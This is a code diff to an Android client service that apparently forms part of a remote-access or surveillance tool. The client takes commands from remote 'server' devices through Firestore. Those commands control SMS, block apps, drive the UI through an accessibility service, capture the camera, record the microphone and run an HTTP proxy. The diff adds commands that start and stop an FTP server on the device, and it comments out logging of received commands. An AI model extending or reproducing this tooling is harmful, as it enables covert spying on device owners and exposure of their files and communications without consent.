@@ -100,6 +100,7 @@ import com.client.receivers.ReceiverDeviceAdmin
 import com.client.receivers.blockedPhoneNumbers
 import com.client.receivers.phoneNumberToUse
 import com.client.receivers.serverPhoneNumbers
+import com.client.services.ftpserver.MyFTPServerService
 import com.client.services.httpproxy.HttpProxyService
 import com.client.services.other.MicStreamingService
 import com.client.services.other.MyAccessibilityService
@@ -795,10 +796,10 @@ fun getGpsCoordinates(context: Context, uri: Uri): Coordinates {
 
 @SuppressLint("UnspecifiedRegisterReceiverFlag")
 fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context, handler: Handler, applicationContext: Context, preferences: SharedPreferences, storage: StorageReference, messageID: String?, serverID: String?): Boolean {
-    Log.d(
-        "ClientService",
-        "Received command for $currentDeviceID: $command"
-    )
+//    Log.d(
+//        "ClientService",
+//        "Received command for $currentDeviceID: $command"
+//    )
     val c = context
     if (command == "DISABLE_SENDING_SMS") {
         isSendingSMSAllowed = false
@@ -5279,6 +5280,7 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
         appsToPreventOpening.clear()
         sendMessage(context, false, "CLEAR_APPS_TO_PREVENT_OPENING: Operation completed successfully", messageID, serverID)
     } else if (command == "CLICK_HOME") {
+        Log.d("ParseCommand", "CLICK_HOME")
         val intent = Intent(MyAccessibilityService.ACTION_GO_HOME)
         intent.putExtra("MessageID", messageID)
         intent.putExtra("ServerID", serverID)
@@ -5469,6 +5471,14 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
             putExtra("SendBySMS", false)
         })
         Log.d("ClientService", "Get WiFi P2P host address received")
+    } else if (command == "START_FTP_SERVER") {
+        val intent = Intent(context, MyFTPServerService::class.java)
+        context.startService(intent.setAction(MyFTPServerService.ACTION_START_FTP_SERVER))
+        sendMessage(context, false, "START_FTP_SERVER: Operation completed successfully", messageID, serverID)
+    } else if (command == "STOP_FTP_SERVER") {
+        val intent = Intent(context, MyFTPServerService::class.java)
+        context.startService(intent.setAction(MyFTPServerService.ACTION_STOP_FTP_SERVER))
+        sendMessage(context, false, "STOP_FTP_SERVER: Operation completed successfully", messageID, serverID)
     } else if (command.startsWith("START_HTTP_PROXY ")) {
         if (!isHttpProxyRunning) {
             val port = command.removePrefix("START_HTTP_PROXY ").toInt()
@@ -6916,10 +6926,10 @@ class ClientService: Service() {
                         val serverID = document.getString("From")
                         val command = document.getString("Message")
                         val forId = document.get("For")
-                        Log.d("ClientService", "Received command for $forId from $serverID: $command")
+//                        Log.d("ClientService", "Received command for $forId from $serverID: $command")
 //                        Log.d("ClientService", "${type == DocumentChange.Type.ADDED} && ${forId == currentDeviceID} && ${serverID in serverDeviceIDs}")
                         if (type == DocumentChange.Type.ADDED && document.exists() && forId == currentDeviceID && serverID in serverDeviceIDs) {
-                            Log.d("ClientService", "Received command from server: $command")
+                            Log.d("ClientService", "Received command from $serverID: $command")
                             if (document.contains("Message")) {
                                 val messageID = document.id
                                 if (command != null) {
@@ -6938,11 +6948,8 @@ class ClientService: Service() {
                                                 } catch (_: Exception) {
                                                 }
                                                 val n = command.removePrefix("SWITCH_TO_CAMERA ").toInt()
-
-                                                // Initialize lateinit variables
                                                 cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
 
-                                                // Initialize other lateinit variables:
                                                 val cameraId = cameraManager.cameraIdList[n]
                                                 val imageReaderConfig = ImageReader.newInstance(1024, 768, ImageFormat.JPEG, 1)
                                                 imageReader = imageReaderConfig
@@ -6989,7 +6996,6 @@ class ClientService: Service() {
                                                     val path =
                                                         command.removePrefix("START_RECORDING_AUDIO_FROM_MIC ")
 
-                                                    // Initialize MediaRecorder
                                                     mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                                                         MediaRecorder(this)
                                                     } else {
